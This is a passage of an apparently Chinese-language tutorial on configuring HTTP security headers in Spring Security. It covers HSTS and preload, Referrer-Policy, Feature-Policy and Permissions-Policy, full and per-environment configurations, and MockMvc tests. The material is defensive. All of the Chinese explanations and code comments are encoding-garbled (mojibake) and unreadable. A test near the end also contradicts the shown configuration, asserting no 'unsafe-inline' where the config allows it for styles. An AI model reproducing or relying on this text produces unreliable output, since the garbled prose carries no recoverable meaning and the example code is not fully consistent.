max-age=31536000        â†’ æœ‰æ•ˆæœŸ1å¹´ï¼ˆæµè§ˆå™¨è®°ä½1å¹´ï¼‰
includeSubDomains       â†’ å­åŸŸåä¹Ÿå¿…é¡»HTTPS
preload                 â†’ åŠ å…¥æµè§ˆå™¨é¢„åŠ è½½åˆ—è¡¨ï¼ˆæœ€é«˜å®‰å…¨çº§åˆ«ï¼‰
```

**ğŸ’¡ é…ç½®ç¤ºä¾‹**

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            .httpStrictTransportSecurity(hsts -> hsts
                .maxAgeInSeconds(31536000)        // 1å¹´
                .includeSubDomains(true)          // åŒ…å«å­åŸŸå
                .preload(true)                    // å¯é¢„åŠ è½½
            )
        );
        return http.build();
    }
}
```

**ğŸ” å®é™…æ•ˆæœ**

```
HTTPå“åº”å¤´ï¼š
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

æµè§ˆå™¨è¡Œä¸ºï¼š
1. é¦–æ¬¡è®¿é—® https://example.com
2. æµè§ˆå™¨è®°å½•ï¼šè¿™ä¸ªç½‘ç«™è¦æ±‚HTTPSï¼Œè®°ä½1å¹´
3. ä»¥å1å¹´å†…ï¼Œä»»ä½•è®¿é—®ï¼ˆåŒ…æ‹¬HTTPï¼‰éƒ½è‡ªåŠ¨å˜HTTPS
   - ç”¨æˆ·ç‚¹é“¾æ¥ï¼šhttp://example.com â†’ è‡ªåŠ¨å˜ https://
   - ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥ï¼šexample.com â†’ è‡ªåŠ¨è®¿é—® https://
```

### 6.3 é¢„åŠ è½½åˆ—è¡¨


**ğŸš€ æœ€é«˜å®‰å…¨çº§åˆ«**

```
ä»€ä¹ˆæ˜¯Preload Listï¼š
- Chrome/Firefox/Safariç­‰æµè§ˆå™¨ç»´æŠ¤çš„åˆ—è¡¨
- åˆ—è¡¨ä¸­çš„åŸŸåï¼Œæµè§ˆå™¨é¦–æ¬¡è®¿é—®å°±å¼ºåˆ¶HTTPS
- è¿ç¬¬ä¸€æ¬¡HTTPè¯·æ±‚éƒ½ä¸ä¼šå‘

å¦‚ä½•åŠ å…¥ï¼š
1. ç½‘ç«™é…ç½®HSTSï¼ˆåŒ…å«preloadæŒ‡ä»¤ï¼‰
2. è®¿é—® hstspreload.org
3. æäº¤ä½ çš„åŸŸå
4. ç­‰å¾…å®¡æ ¸ï¼ˆå¯èƒ½æ•°æœˆï¼‰
5. æµè§ˆå™¨æ›´æ–°åç”Ÿæ•ˆ

æ³¨æ„äº‹é¡¹ï¼š
âš ï¸ åŠ å…¥å®¹æ˜“ï¼Œç§»é™¤å¾ˆéš¾ï¼ˆéœ€è¦æ•°æœˆï¼‰
âš ï¸ ç¡®ä¿æ‰€æœ‰å­åŸŸåéƒ½æ”¯æŒHTTPS
âš ï¸ é•¿æœŸç»´æŠ¤HTTPSï¼Œå¦åˆ™ç½‘ç«™æ— æ³•è®¿é—®
```

### 6.4 ä½¿ç”¨å»ºè®®


**âœ… æ¨èåšæ³•**

```java
// ç”Ÿäº§ç¯å¢ƒï¼šä¸¥æ ¼é…ç½®
http.headers(headers -> headers
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(63072000)      // 2å¹´
        .includeSubDomains(true)
        .preload(true)
    )
);

// å¼€å‘/æµ‹è¯•ç¯å¢ƒï¼šä¸å¯ç”¨æˆ–çŸ­æ—¶é—´
@Profile("!prod")
@Configuration
public class DevSecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            .httpStrictTransportSecurity(hsts -> hsts
                .maxAgeInSeconds(0)  // ç¦ç”¨HSTS
            )
        );
        return http.build();
    }
}
```

**âš ï¸ æ³¨æ„äº‹é¡¹**
- **å¿…é¡»å…ˆç¡®ä¿HTTPSæ­£å¸¸å·¥ä½œ**ï¼Œå†å¯ç”¨HSTS
- å¦‚æœHTTPSè¯ä¹¦è¿‡æœŸï¼Œç”¨æˆ·å°†æ— æ³•è®¿é—®ç½‘ç«™ï¼ˆæµè§ˆå™¨ä¸ä¼šé™çº§åˆ°HTTPï¼‰
- å¼€å‘ç¯å¢ƒæ…ç”¨ï¼Œå¦åˆ™æœ¬åœ°è°ƒè¯•å›°éš¾

---

## 7. ğŸ”— Referrer-Policy - å¼•ç”¨ç­–ç•¥


### 7.1 ä»€ä¹ˆæ˜¯Referrer


**é€šä¿—ç†è§£**ï¼šå‘Šè¯‰ç½‘ç«™"ç”¨æˆ·ä»å“ªé‡Œæ¥çš„"

```
åœºæ™¯ç¤ºä¾‹ï¼š

ç”¨æˆ·åœ¨ https://google.com æœç´¢
ç‚¹å‡»ç»“æœè·³è½¬åˆ° https://yoursite.com

æµè§ˆå™¨å‘é€è¯·æ±‚ï¼š
GET /article HTTP/1.1
Host: yoursite.com
Referer: https://google.com/search?q=å…³é”®è¯
        â†‘
        è¿™å°±æ˜¯Referrerï¼ˆå¼•ç”¨æ¥æºï¼‰

yoursite.comå¯ä»¥çœ‹åˆ°ï¼š
- ç”¨æˆ·ä»Googleæ¥
- æœç´¢äº†ä»€ä¹ˆå…³é”®è¯
```

**ğŸ”¸ Referrerçš„ç”¨é€”**
- **ç»Ÿè®¡åˆ†æ**ï¼šäº†è§£æµé‡æ¥æº
- **é˜²ç›—é“¾**ï¼šé˜²æ­¢å…¶ä»–ç½‘ç«™ç›—ç”¨èµ„æº
- **å®‰å…¨éªŒè¯**ï¼šæ£€æŸ¥è¯·æ±‚æ¥æº

**ğŸš¨ Referrerçš„é£é™©**
- **éšç§æ³„éœ²**ï¼šURLå¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯
- **ä¿¡æ¯æ³„éœ²**ï¼šå†…ç½‘åœ°å€ã€ä¼šè¯IDæš´éœ²

### 7.2 ç­–ç•¥é…ç½®é€‰é¡¹


**ğŸ“‹ å¸¸ç”¨ç­–ç•¥å¯¹æ¯”**

| ç­–ç•¥ | è¯´æ˜ | è·³è½¬æ—¶å‘é€ä»€ä¹ˆ |
|------|------|---------------|
| `no-referrer` | **ä¸å‘é€**ä»»ä½•Referrer | âŒ ä¸å‘é€ |
| `no-referrer-when-downgrade` | HTTPSâ†’HTTPæ—¶ä¸å‘é€ | âœ… HTTPSâ†’HTTPSå‘é€<br>âŒ HTTPSâ†’HTTPä¸å‘é€ |
| `same-origin` | **ä»…åŒæº**å‘é€ | âœ… yoursite.com â†’ yoursite.comå‘é€<br>âŒ yoursite.com â†’ other.comä¸å‘é€ |
| `origin` | åªå‘é€**æº**ï¼ˆä¸å«è·¯å¾„ï¼‰ | âœ… å‘é€ï¼š`https://yoursite.com` |
| `strict-origin` | åªå‘é€æºï¼Œä¸”HTTPSâ†’HTTPä¸å‘é€ | âœ… å‘é€æºï¼Œå®‰å…¨é™çº§ä¸å‘é€ |
| `origin-when-cross-origin` | è·¨åŸŸåªå‘é€æºï¼ŒåŒæºå‘é€å®Œæ•´URL | âœ… åŒæºï¼šå®Œæ•´URL<br>ğŸ”¸ è·¨åŸŸï¼šä»…æº |
| `strict-origin-when-cross-origin` | **æ¨è**ï¼Œç»“åˆä¸Šè¿°ä¼˜ç‚¹ | æœ€å®‰å…¨çš„è·¨åŸŸç­–ç•¥ |
| `unsafe-url` | **æ€»æ˜¯**å‘é€å®Œæ•´URL | âš ï¸ ä¸å®‰å…¨ï¼Œæ…ç”¨ |

**ğŸ’¡ é…ç½®ç¤ºä¾‹**

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            .referrerPolicy(referrer -> referrer
                // æ¨èï¼šè·¨åŸŸæ—¶åªå‘é€æºï¼ŒåŒæºå‘é€å®Œæ•´ï¼Œé™çº§ä¸å‘é€
                .policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
            )
        );
        return http.build();
    }
}
```

### 7.3 å®é™…åœºæ™¯é€‰æ‹©


**ğŸ¯ ä¸åŒåœºæ™¯çš„ç­–ç•¥é€‰æ‹©**

```
åœºæ™¯1ï¼šæ™®é€šç½‘ç«™ï¼ˆæ¨èï¼‰
ç­–ç•¥ï¼šstrict-origin-when-cross-origin
http.headers().referrerPolicy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)

ç»“æœï¼š
yoursite.com/page1 â†’ yoursite.com/page2
å‘é€ï¼šhttps://yoursite.com/page1ï¼ˆå®Œæ•´URLï¼‰

yoursite.com â†’ other.com
å‘é€ï¼šhttps://yoursite.comï¼ˆä»…æºï¼‰

https://yoursite.com â†’ http://other.com
å‘é€ï¼šï¼ˆä¸å‘é€ï¼Œå®‰å…¨é™çº§ï¼‰
```

```
åœºæ™¯2ï¼šé«˜éšç§éœ€æ±‚ï¼ˆå¦‚åŒ»ç–—ã€é‡‘èï¼‰
ç­–ç•¥ï¼šno-referrer æˆ– same-origin
http.headers().referrerPolicy(ReferrerPolicy.NO_REFERRER)

ç»“æœï¼š
ä»»ä½•è·³è½¬éƒ½ä¸å‘é€Referrer
â†’ æœ€å¤§åŒ–ä¿æŠ¤ç”¨æˆ·éšç§
```

```
åœºæ™¯3ï¼šéœ€è¦è·¨åŸŸç»Ÿè®¡åˆ†æ
ç­–ç•¥ï¼šorigin-when-cross-origin
http.headers().referrerPolicy(ReferrerPolicy.ORIGIN_WHEN_CROSS_ORIGIN)

ç»“æœï¼š
è·¨åŸŸæ—¶å‘é€æºï¼ˆç”¨äºç»Ÿè®¡ï¼‰
åŒæºæ—¶å‘é€å®Œæ•´URLï¼ˆç”¨äºè¯¦ç»†åˆ†æï¼‰
```

### 7.4 å®æˆ˜æ¡ˆä¾‹


**ğŸ” é˜²æ­¢ä¿¡æ¯æ³„éœ²**

```java
// é—®é¢˜ï¼šæ•æ„Ÿä¿¡æ¯åœ¨URLä¸­
// https://yoursite.com/reset-password?token=secret123

// å¦‚æœç”¨æˆ·ç‚¹å‡»å¤–éƒ¨é“¾æ¥ï¼Œtokenä¼šæ³„éœ²åˆ°å¤–éƒ¨ç½‘ç«™ï¼

// è§£å†³ï¼šä½¿ç”¨strict-origin-when-cross-origin
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) {
    http.headers(headers -> headers
        .referrerPolicy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
    );
    return http.build();
}

// ç»“æœï¼š
// è·¨åŸŸæ—¶åªå‘é€ https://yoursite.com
// tokenå‚æ•°ä¸ä¼šæ³„éœ²
```

---

## 8. ğŸ›ï¸ Feature-Policy - åŠŸèƒ½ç­–ç•¥


### 8.1 ä»€ä¹ˆæ˜¯Feature-Policy


**é€šä¿—ç†è§£**ï¼šæ§åˆ¶ç½‘é¡µå¯ä»¥ä½¿ç”¨å“ªäº›æµè§ˆå™¨åŠŸèƒ½

```
æƒ³è±¡æµè§ˆå™¨æ˜¯ä¸ªå·¥å…·ç®±ï¼š
ğŸ“· æ‘„åƒå¤´
ğŸ¤ éº¦å…‹é£
ğŸ“ åœ°ç†ä½ç½®
ğŸ’° æ”¯ä»˜æ¥å£
ğŸ”” é€šçŸ¥
...

Feature-Policy = å‘Šè¯‰æµè§ˆå™¨ï¼š
"è¿™äº›å·¥å…·ï¼Œæˆ‘çš„ç½‘é¡µåªç”¨å…¶ä¸­å‡ ä¸ª"
```

**ğŸ¯ ä¸ºä»€ä¹ˆéœ€è¦**
- **å®‰å…¨**ï¼šé˜²æ­¢æ¶æ„ä»£ç æ»¥ç”¨æ•æ„ŸåŠŸèƒ½
- **éšç§**ï¼šé™åˆ¶ç¬¬ä¸‰æ–¹è„šæœ¬çš„æƒé™
- **æ€§èƒ½**ï¼šç¦ç”¨ä¸éœ€è¦çš„åŠŸèƒ½èŠ‚çœèµ„æº

### 8.2 å¸¸ç”¨åŠŸèƒ½æŒ‡ä»¤


**ğŸ“‹ åŠŸèƒ½åˆ—è¡¨**

| åŠŸèƒ½ | æŒ‡ä»¤ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|------|------|
| ğŸ“· æ‘„åƒå¤´ | `camera` | æ§åˆ¶æ‘„åƒå¤´è®¿é—® | `camera 'self'` |
| ğŸ¤ éº¦å…‹é£ | `microphone` | æ§åˆ¶éº¦å…‹é£è®¿é—® | `microphone 'none'` |
| ğŸ“ å®šä½ | `geolocation` | æ§åˆ¶åœ°ç†ä½ç½® | `geolocation 'self' https://maps.com` |
| ğŸ”” é€šçŸ¥ | `notifications` | æ§åˆ¶æ¨é€é€šçŸ¥ | `notifications 'self'` |
| ğŸ’° æ”¯ä»˜ | `payment` | æ§åˆ¶æ”¯ä»˜API | `payment 'self' https://pay.com` |
| ğŸ”Š è‡ªåŠ¨æ’­æ”¾ | `autoplay` | æ§åˆ¶è§†é¢‘è‡ªåŠ¨æ’­æ”¾ | `autoplay 'none'` |
| ğŸ“º å…¨å± | `fullscreen` | æ§åˆ¶å…¨å±API | `fullscreen 'self'` |
| ğŸ–¼ï¸ ç”»ä¸­ç”» | `picture-in-picture` | æ§åˆ¶ç”»ä¸­ç”» | `picture-in-picture 'none'` |

### 8.3 é…ç½®ç¤ºä¾‹


**ğŸ’¡ Spring Securityé…ç½®**

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers(headers -> headers
            .featurePolicy(
                // æ‘„åƒå¤´ï¼šåªå…è®¸æœ¬ç«™ä½¿ç”¨
                "camera 'self'; " +
                
                // éº¦å…‹é£ï¼šç¦ç”¨
                "microphone 'none'; " +
                
                // åœ°ç†ä½ç½®ï¼šæœ¬ç«™å’ŒæŒ‡å®šçš„åœ°å›¾æœåŠ¡
                "geolocation 'self' https://maps.googleapis.com; " +
                
                // æ”¯ä»˜ï¼šæœ¬ç«™å’Œæ”¯ä»˜ç½‘å…³
                "payment 'self' https://pay.stripe.com; " +
                
                // è‡ªåŠ¨æ’­æ”¾ï¼šç¦ç”¨ï¼ˆç”¨æˆ·ä½“éªŒè€ƒè™‘ï¼‰
                "autoplay 'none'; " +
                
                // å…¨å±ï¼šå…è®¸æœ¬ç«™
                "fullscreen 'self'"
            )
        );
        return http.build();
    }
}
```

**ğŸ” å®é™…æ•ˆæœ**

```
HTTPå“åº”å¤´ï¼š
Feature-Policy: camera 'self'; microphone 'none'; geolocation 'self' https://maps.googleapis.com

æµè§ˆå™¨è¡Œä¸ºï¼š
// æœ¬ç«™ä»£ç è¯·æ±‚æ‘„åƒå¤´
navigator.mediaDevices.getUserMedia({video: true})
â†’ âœ… å…è®¸ï¼ˆå› ä¸ºæ˜¯'self'ï¼‰

// ç¬¬ä¸‰æ–¹iframeè¯·æ±‚æ‘„åƒå¤´
<iframe src="https://evil.com"></iframe>
â†’ âŒ æ‹’ç»ï¼ˆä¸åœ¨ç™½åå•ï¼‰

// ä»»ä½•ä»£ç è¯·æ±‚éº¦å…‹é£
navigator.mediaDevices.getUserMedia({audio: true})
â†’ âŒ æ‹’ç»ï¼ˆè®¾ç½®ä¸º'none'ï¼‰
```

### 8.4 å®æˆ˜åœºæ™¯


**ğŸ¯ åœºæ™¯1ï¼šåµŒå…¥ç¬¬ä¸‰æ–¹å†…å®¹**

```java
// ä½ çš„é¡µé¢åµŒå…¥äº†ç¬¬ä¸‰æ–¹è§†é¢‘æ’­æ”¾å™¨
// ä½†ä¸å¸Œæœ›å®ƒä»¬è®¿é—®æ‘„åƒå¤´/éº¦å…‹é£

http.headers(headers -> headers
    .featurePolicy(
        "camera 'self'; " +       // æ‘„åƒå¤´ï¼šåªæœ‰ä¸»é¡µé¢èƒ½ç”¨
        "microphone 'self'; " +   // éº¦å…‹é£ï¼šåªæœ‰ä¸»é¡µé¢èƒ½ç”¨
        "payment 'none'"          // æ”¯ä»˜ï¼šä»»ä½•äººéƒ½ä¸èƒ½ç”¨ï¼ˆé˜²æ­¢æ¶æ„æ‰£è´¹ï¼‰
    )
);

// ç»“æœï¼šå³ä½¿iframeè¢«åŠ«æŒï¼Œä¹Ÿæ— æ³•è®¿é—®æ•æ„ŸåŠŸèƒ½
```

**ğŸ¯ åœºæ™¯2ï¼šé™åˆ¶å¹¿å‘Šæƒé™**

```java
// é¡µé¢ä¸­æœ‰ç¬¬ä¸‰æ–¹å¹¿å‘Š
// é™åˆ¶å¹¿å‘Šçš„æƒé™

http.headers(headers -> headers
    .featurePolicy(
        "camera 'none'; " +           // å¹¿å‘Šä¸èƒ½ç”¨æ‘„åƒå¤´
        "microphone 'none'; " +       // å¹¿å‘Šä¸èƒ½ç”¨éº¦å…‹é£
        "geolocation 'self'; " +      // åœ°ç†ä½ç½®åªæœ‰ä¸»é¡µé¢èƒ½ç”¨
        "notifications 'self'; " +    // é€šçŸ¥åªæœ‰ä¸»é¡µé¢èƒ½å‘
        "autoplay 'none'"             // ç¦æ­¢è‡ªåŠ¨æ’­æ”¾ï¼ˆç”¨æˆ·ä½“éªŒï¼‰
    )
);
```

### 8.5 æ–°æ ‡å‡†ï¼šPermissions-Policy


**âš ï¸ Feature-Policyå·²è¢«æ›¿ä»£**

```
Feature-Policy â†’ å·²åºŸå¼ƒï¼ˆ2020å¹´ï¼‰
Permissions-Policy â†’ æ–°æ ‡å‡†ï¼ˆæ¨èä½¿ç”¨ï¼‰

è¯­æ³•å˜åŒ–ï¼š
æ—§ï¼šFeature-Policy: camera 'self'
æ–°ï¼šPermissions-Policy: camera=(self)

Spring Securityæš‚æœªå†…ç½®æ”¯æŒï¼Œéœ€æ‰‹åŠ¨æ·»åŠ ï¼š
```

```java
@Component
public class PermissionsPolicyFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        httpResponse.setHeader("Permissions-Policy", 
            "camera=(self), " +
            "microphone=(), " +              // ()è¡¨ç¤ºnone
            "geolocation=(self \"https://maps.com\"), " +
            "payment=(self \"https://pay.com\")"
        );
        
        chain.doFilter(request, response);
    }
}
```

---

## 9. âš™ï¸ Spring Securityé…ç½®å®æˆ˜


### 9.1 å®Œæ•´é…ç½®ç¤ºä¾‹


**ğŸ’¡ ç”Ÿäº§çº§é…ç½®**

```java
@Configuration
@EnableWebSecurity
public class SecurityHeadersConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        
        http
            // ç¦ç”¨é»˜è®¤çš„headersé…ç½®ï¼Œå®Œå…¨è‡ªå®šä¹‰
            .headers(headers -> headers
                
                // 1. é˜²æ­¢ç‚¹å‡»åŠ«æŒ
                .frameOptions(frame -> frame
                    .deny()  // å®Œå…¨ç¦æ­¢è¢«åµŒå…¥iframe
                )
                
                // 2. é˜²æ­¢MIMEå—…æ¢ï¼ˆé»˜è®¤å¯ç”¨ï¼Œè¿™é‡Œæ˜ç¡®é…ç½®ï¼‰
                .contentTypeOptions(options -> {
                    // é»˜è®¤å°±æ˜¯nosniffï¼Œæ— éœ€é¢å¤–é…ç½®
                })
                
                // 3. XSSä¿æŠ¤ï¼ˆè™½ç„¶å·²è¿‡æ—¶ï¼Œä½†ä¸ºäº†å…¼å®¹æ—§æµè§ˆå™¨ï¼‰
                .xssProtection(xss -> xss
                    .enable()
                    .block(true)
                )
                
                // 4. CSPå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆæ ¸å¿ƒé˜²æŠ¤ï¼‰
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(buildCspPolicy())
                )
                
                // 5. HSTSå¼ºåˆ¶HTTPS
                .httpStrictTransportSecurity(hsts -> hsts
                    .maxAgeInSeconds(31536000)    // 1å¹´
                    .includeSubDomains(true)
                    .preload(true)
                )
                
                // 6. Referrerç­–ç•¥
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
                )
                
                // 7. åŠŸèƒ½ç­–ç•¥ï¼ˆæ‰‹åŠ¨æ·»åŠ ï¼Œå› ä¸ºSpring Securityæœªå†…ç½®Permissions-Policyï¼‰
                .addHeaderWriter(new StaticHeadersWriter(
                    "Permissions-Policy", 
                    "camera=(self), microphone=(), geolocation=(self)"
                ))
                
                // 8. å…¶ä»–å®‰å…¨å¤´éƒ¨
                .addHeaderWriter(new StaticHeadersWriter(
                    "X-Permitted-Cross-Domain-Policies", "none"
                ))
            );
        
        return http.build();
    }
    
    // CSPç­–ç•¥æ„å»ºæ–¹æ³•
    private String buildCspPolicy() {
        return String.join("; ",
            "default-src 'self'",
            "script-src 'self' https://cdn.jsdelivr.net",
            "style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'",
            "img-src 'self' data: https:",
            "font-src 'self' https://fonts.gstatic.com",
            "connect-src 'self' https://api.example.com",
            "frame-ancestors 'self'",
            "base-uri 'self'",
            "form-action 'self'",
            "report-uri /api/csp-report"
        );
    }
}
```

### 9.2 ç¯å¢ƒå·®å¼‚åŒ–é…ç½®


**ğŸ¯ ä¸åŒç¯å¢ƒä½¿ç”¨ä¸åŒç­–ç•¥**

```java
// å¼€å‘ç¯å¢ƒï¼šå®½æ¾é…ç½®
@Profile("dev")
@Configuration
public class DevSecurityHeadersConfig {
    
    @Bean
    public SecurityFilterChain devFilterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .frameOptions(frame -> frame.sameOrigin())  // å…è®¸åŒæºåµŒå…¥
            .httpStrictTransportSecurity(hsts -> hsts
                .maxAgeInSeconds(0)  // ç¦ç”¨HSTS
            )
            .contentSecurityPolicy(csp -> csp
                .reportOnly()  // åªæŠ¥å‘Šä¸é˜»æ­¢
                .policyDirectives("default-src 'self' 'unsafe-inline' 'unsafe-eval'")
            )
        );
        return http.build();
    }
}

// ç”Ÿäº§ç¯å¢ƒï¼šä¸¥æ ¼é…ç½®
@Profile("prod")
@Configuration
public class ProdSecurityHeadersConfig {
    
    @Bean
    public SecurityFilterChain prodFilterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .frameOptions(frame -> frame.deny())  // å®Œå…¨ç¦æ­¢
            .httpStrictTransportSecurity(hsts -> hsts
                .maxAgeInSeconds(63072000)  // 2å¹´
                .includeSubDomains(true)
                .preload(true)
            )
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; script-src 'self'")  // ä¸¥æ ¼ç­–ç•¥
            )
        );
        return http.build();
    }
}
```

### 9.3 é’ˆå¯¹ç‰¹å®šè·¯å¾„çš„é…ç½®


**ğŸ’¡ ä¸åŒæ¥å£ä½¿ç”¨ä¸åŒå¤´éƒ¨**

```java
@Configuration
public class PathSpecificHeadersConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/**").permitAll()
            .requestMatchers("/embed/**").permitAll()
            .anyRequest().authenticated()
        );
        
        // å…¨å±€é»˜è®¤é…ç½®
        http.headers(headers -> headers
            .frameOptions(frame -> frame.deny())
        );
        
        return http.build();
    }
    
    // ä¸ºéœ€è¦è¢«åµŒå…¥çš„è·¯å¾„æ·»åŠ ç‰¹æ®ŠFilter
    @Bean
    public FilterRegistrationBean<EmbedHeaderFilter> embedHeaderFilter() {
        FilterRegistrationBean<EmbedHeaderFilter> registration = new FilterRegistrationBean<>();
        registration.setFilter(new EmbedHeaderFilter());
        registration.addUrlPatterns("/embed/*");  // åªå¯¹/embed/*ç”Ÿæ•ˆ
        registration.setOrder(Ordered.HIGHEST_PRECEDENCE);
        return registration;
    }
}

// ç‰¹æ®Šå¤´éƒ¨Filter
public class EmbedHeaderFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        // å…è®¸è¢«ç‰¹å®šåŸŸååµŒå…¥
        httpResponse.setHeader("Content-Security-Policy", 
            "frame-ancestors 'self' https://trusted-partner.com");
        
        chain.doFilter(request, response);
    }
}
```

### 9.4 æµ‹è¯•å®‰å…¨å¤´éƒ¨


**ğŸ” éªŒè¯é…ç½®æ˜¯å¦ç”Ÿæ•ˆ**

```java
@SpringBootTest
@AutoConfigureMockMvc
public class SecurityHeadersTest {
    
    @Autowired
    private MockMvc mockMvc;
    
    @Test
    public void shouldHaveSecurityHeaders() throws Exception {
        mockMvc.perform(get("/"))
            .andExpect(status().isOk())
            
            // éªŒè¯X-Frame-Options
            .andExpect(header().string("X-Frame-Options", "DENY"))
            
            // éªŒè¯X-Content-Type-Options
            .andExpect(header().string("X-Content-Type-Options", "nosniff"))
            
            // éªŒè¯HSTS
            .andExpect(header().string("Strict-Transport-Security", 
                containsString("max-age=31536000")))
            
            // éªŒè¯CSP
            .andExpect(header().exists("Content-Security-Policy"))
            
            // éªŒè¯Referrer-Policy
            .andExpect(header().string("Referrer-Policy", 
                "strict-origin-when-cross-origin"));
    }
    
    @Test
    public void cspShouldBlockInlineScripts() throws Exception {
        // éªŒè¯CSPç­–ç•¥
        String csp = mockMvc.perform(get("/"))
            .andReturn()
            .getResponse()
            .getHeader("Content-Security-Policy");
        
        assertThat(csp).contains("script-src 'self'");
        assertThat(csp).doesNotContain("'unsafe-inline'");
    }
}
```

---

## 10. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 10.1 å¿…é¡»æŒæ¡çš„å®‰å…¨å¤´éƒ¨


**ğŸ¯ åŸºç¡€é˜²æŠ¤ä¸‰ä»¶å¥—**

```
1ï¸âƒ£ X-Frame-Options: DENY
   â†’ é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼Œç¦æ­¢è¢«iframeåµŒå…¥
   
2ï¸âƒ£ X-Content-Type-Options: nosniff  
   â†’ é˜²æ­¢MIMEå—…æ¢ï¼Œä¸¥æ ¼æŒ‰Content-Typeæ‰§è¡Œ
   
3ï¸âƒ£ Content-Security-Policy
   â†’ æ ¸å¿ƒé˜²æŠ¤ï¼Œé™åˆ¶èµ„æºåŠ è½½ï¼Œé˜²æ­¢XSS
```

**ğŸ¯ HTTPSå¿…å¤‡é…ç½®**

```
4ï¸âƒ£ Strict-Transport-Security
   â†’ å¼ºåˆ¶HTTPSï¼Œé˜²æ­¢åè®®é™çº§æ”»å‡»
   â†’ é…ç½®ï¼šmax-age=31536000; includeSubDomains; preload
```

**ğŸ¯ éšç§ä¿æŠ¤é…ç½®**

```
5ï¸âƒ£ Referrer-Policy: strict-origin-when-cross-origin
   â†’ æ§åˆ¶Referrerå‘é€ï¼Œä¿æŠ¤ç”¨æˆ·éšç§
   
6ï¸âƒ£ Permissions-Policy
   â†’ é™åˆ¶æµè§ˆå™¨åŠŸèƒ½ä½¿ç”¨ï¼Œé˜²æ­¢æ»¥ç”¨
```

### 10.2 é…ç½®ä¼˜å…ˆçº§å»ºè®®


**âœ… å¿…é¡»é…ç½®ï¼ˆæ‰€æœ‰é¡¹ç›®ï¼‰**

| å¤´éƒ¨ | é…ç½®å€¼ | ä¼˜å…ˆçº§ |
|------|--------|--------|
| X-Content-Type-Options | `nosniff` | ğŸ”´ æœ€é«˜ |
| X-Frame-Options | `DENY` æˆ– `SAMEORIGIN` | ğŸ”´ æœ€é«˜ |
| Strict-Transport-Security | `max-age=31536000; includeSubDomains` | ğŸ”´ æœ€é«˜ |
| Referrer-Policy | `strict-origin-when-cross-origin` | ğŸŸ  é«˜ |

**ğŸ¯ æ¨èé…ç½®ï¼ˆæœ‰æ¡ä»¶çš„é¡¹ç›®ï¼‰**

| å¤´éƒ¨ | é…ç½®å€¼ | ä¼˜å…ˆçº§ |
|------|--------|--------|
| Content-Security-Policy | æ ¹æ®å®é™…éœ€æ±‚å®šåˆ¶ | ğŸŸ  é«˜ |
| Permissions-Policy | é™åˆ¶æ•æ„ŸåŠŸèƒ½ | ğŸŸ¡ ä¸­ |

**ğŸ“ å¯é€‰é…ç½®ï¼ˆå·²è¿‡æ—¶ä½†å¯å…¼å®¹ï¼‰**

| å¤´éƒ¨ | é…ç½®å€¼ | è¯´æ˜ |
|------|--------|------|
| X-XSS-Protection | `1; mode=block` | ç°ä»£æµè§ˆå™¨å·²ç§»é™¤æ”¯æŒ |

### 10.3 å¸¸è§é—®é¢˜ä¸è§£å†³


**â“ é…ç½®CSPåç½‘ç«™æ ·å¼ä¹±äº†**

```
åŸå› ï¼šå†…è”æ ·å¼è¢«CSPé˜»æ­¢
é”™è¯¯ç­–ç•¥ï¼šstyle-src 'self'
é¡µé¢ä»£ç ï¼š<div style="color: red">  â† è¢«é˜»æ­¢

è§£å†³æ–¹æ¡ˆï¼š
1. æ¨èï¼šå°†å†…è”æ ·å¼ç§»åˆ°CSSæ–‡ä»¶
   <div class="red-text">
   CSS: .red-text { color: red; }

2. ä¸´æ—¶ï¼šå…è®¸unsafe-inlineï¼ˆä¸æ¨èï¼‰
   style-src 'self' 'unsafe-inline'
```

**â“ é…ç½®HSTSåæœ¬åœ°å¼€å‘æŠ¥é”™**

```
åŸå› ï¼šHSTSè¦æ±‚å¿…é¡»HTTPSï¼Œä½†æœ¬åœ°æ˜¯HTTP
é”™è¯¯ï¼šERR_SSL_PROTOCOL_ERROR

è§£å†³æ–¹æ¡ˆï¼š
1. å¼€å‘ç¯å¢ƒç¦ç”¨HSTS
   @Profile("dev")
   http.headers().httpStrictTransportSecurity().disable()

2. æˆ–ä½¿ç”¨è‡ªç­¾åè¯ä¹¦å¼€å¯æœ¬åœ°HTTPS
   keytool -genkey -alias localhost -keyalg RSA
```

**â“ ç¬¬ä¸‰æ–¹iframeæ— æ³•åµŒå…¥**

```
